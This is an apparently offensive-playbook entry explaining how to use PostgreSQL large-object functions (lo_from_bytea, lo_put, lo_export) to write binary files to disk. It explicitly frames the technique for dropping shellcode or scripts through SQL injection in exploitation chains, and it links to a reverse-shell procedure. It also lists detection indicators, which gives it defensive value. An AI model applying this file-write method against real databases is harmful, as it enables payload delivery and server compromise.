---
id: 95ce8303-b430-4950-a286-6e44ba07bbc1
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:35.993370+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - postgresql
  - large-object
  - binary
  - file-write
validated: true
---

# PostgreSQL-Large-Object-Manipulation-for-Binary-Write

## Code

```sql
SELECT lo_from_bytea(oid, 'your file data goes in here'); -- create a large object with OID oid and some data
SELECT lo_put(oid, offset, 'some other data'); -- append data to a large object at offset offset
SELECT lo_export(oid, '/tmp/testexport'); -- export data to /tmp/testexport
```

## Description

This code handles PostgreSQL large objects: creates one from bytea data, appends more data, and exports to file. Useful for writing binary payloads like shellcode or scripts that exceed text limits.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| oid | Large object ID | 1001 |
| offset | Append position in bytes | 0 |
| 'your file data goes in here' | Initial bytea data | '\xdeadbeef...' |
| 'some other data' | Append data | '\xadditional...' |
| /tmp/testexport | Export path | /tmp/binary_payload |

## Usage

Run sequence via psql or injection to build and write binary files. Replace placeholders with actual data (use encode/decode for hex/base64). Ideal for complex payloads in exploitation chains.

## Detection

- Queries using lo_from_bytea, lo_put, lo_export in logs.
- Unusual large objects created (check pg_largeobject table).
- Binary files written by postgres user in monitored dirs.

## Related

- [[procedures/PostgreSQL-File-Write-with-Reverse-Shell-Payload]]
